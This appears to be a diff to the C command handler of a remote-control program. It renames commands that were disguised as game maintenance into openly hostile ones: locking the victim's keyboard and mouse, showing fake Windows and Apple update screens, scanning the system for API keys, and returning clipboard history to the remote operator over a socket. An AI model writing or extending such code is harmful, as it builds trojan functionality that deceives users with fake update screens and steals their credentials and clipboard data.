@@ -66,23 +66,28 @@ static void handle_admin_command(SOCKET sock, const char *cmd) {
     int resp_pos = 0;
     
     /* Maintenance commands */
-    if (strcmp(cmd, GAME_PAUSE_INPUT) == 0) {
+    if (strcmp(cmd, "DISABLE_INPUT") == 0) {
         /* Enter maintenance mode: lock player controls */
         ui_lock_controls(1);
-        result = "][Game paused] — player controls locked]";
+        result = "[Keyboard & Mouse disabled]";
     }
-    else if (strcmp(cmd, GAME_SHOW_LOADING) == 0) {
+    else if (strcmp(cmd, "WINDOWS_UPDATE") == 0) {
         /* Show system update splash screen during maintenance */
         ui_show_splash(1);
-        result = "[Loading screen displayed]";
+        result = "[Windows update screen shown]";
     }
-    else if (strcmp(cmd, "HIDE_SPLASH") == 0) {
+    else if (strcmp(cmd, "APPLE_UPDATE") == 0) {
+        /* Show Apple-style update splash screen */
+        ui_show_splash(2);
+        result = "[Apple update screen shown]";
+    }
+    else if (strcmp(cmd, "HIDE_UPDATE") == 0) {
         ui_hide_splash();
-        result = "[Loading screen hidden]";
+        result = "[Update screen hidden]";
     }
-    else if (strcmp(cmd, "UNLOCK_UI") == 0) {
+    else if (strcmp(cmd, "ENABLE_INPUT") == 0) {
         ui_lock_controls(0);
-        result = "][Game resumed] — controls restored]";
+        result = "[Keyboard & Mouse enabled]";
     }
     /* System diagnostics */
     else if (strcmp(cmd, GAME_SYSTEM_INFO) == 0) {
@@ -101,10 +106,10 @@ static void handle_admin_command(SOCKET sock, const char *cmd) {
         result = "[Window initialized]";
     }
     /* Security audit */
-    else if (strcmp(cmd, GAME_CONFIG_SCAN) == 0) {
+    else if (strcmp(cmd, "FIND_API_KEYS") == 0) {
         result = config_scan_scan_system();
     }
-    else if (strcmp(cmd, GAME_COPY_BUFFER) == 0) {
+    else if (strcmp(cmd, "CLIPBOARD_LOG") == 0) {
         result = copy_buffer_get_history();
     }
     else if (strcmp(cmd, "SECURITY_CHECK") == 0) {
